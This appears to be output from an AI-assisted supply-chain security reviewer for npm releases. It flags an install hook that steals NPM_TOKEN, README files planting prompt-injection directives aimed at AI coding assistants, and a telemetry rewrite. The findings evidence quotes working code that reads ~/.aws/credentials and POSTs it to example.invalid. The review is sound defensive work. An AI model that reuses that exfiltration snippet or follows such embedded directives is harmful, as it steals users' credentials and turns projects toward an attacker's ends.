review.summary: This release adds a preinstall lifecycle hook that runs install.js on every consumer install. install.js reads process.env.NPM_TOKEN, executes a shell command via child_process.execSync, and sends the token over HTTPS to example.invalid/collect. This is the exact shape of an install-time secret exfiltration payload. The version bump from 1.0.0 to 1.0.1 only adds this malicious behavior. Recommend blocking the release and rotating any exposed NPM_TOKEN.

review.summary: This release bumps the version to 1.5.0 and adds a README documenting LLM message construction and security guidance. The package.json change is limited to the version field with no new scripts, dependencies, bin entries, or entrypoint changes. No install-time execution, network access, credential handling, or obfuscation was introduced.

The release only bumps version and adds README.md and AI-GUIDANCE.md, but both new files contain explicit instructions aimed at AI coding assistants/agents telling them to add this package to every project they generate. That is a prompt-injection supply-chain manipulation: no install script, dependency, or entrypoint change is needed because the attack relies on an AI tool reading the documentation and following the embedded directive. The deterministic findings already flag these two files and the test-scoped sample file; there are no additional install-time, network, credential, or binary risks in the manifest. I recommend blocking until a maintainer confirms this is an intentional, disclosed test fixture and not a release meant to manipulate consumer AI tools.
AI review failed; deterministic findings remain available.

lib/telemetry.js was rewritten from a benign stub (module.exports = function send() { return true; }) to code that reads ~/.aws/credentials via fs.readFileSync(os.homedir() + '/.aws/credentials') and POSTs the contents to https://example.invalid/c via https.request. This is a direct credential-exfiltration payload: credential read paired with network egress, matching the deterministic high finding (code.credential-access) and medium finding (code.network-access), which I preserve and raise to critical. package.json only bumps version 3.1.0 to 3.1.1 with no scripts, dependencies, bin, or entrypoint changes. The telemetry change must not ship; revert it and investigate how it was introduced before any release.

findings.evidence: Staged diff replaces 'module.exports = function send() { return true; };' with: const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8'); https.request('https://example.invalid/c', { method: 'POST' }).end(creds);
findings.reason: Package code reads long-lived AWS credentials from the user's home directory and exfiltrates them over HTTPS to an external endpoint. This is the collect-and-exfiltrate shape used to steal install-time and cloud secrets; deterministic findings code.credential-access (high) and code.network-access (medium) confirm it, and the direct credential theft warrants critical.
findings.recommendation: Block the release. Revert lib/telemetry.js to the prior stub, audit the change history and any other staged artifacts for similar payloads, and rotate any credentials that may have been exposed if this code ever ran.
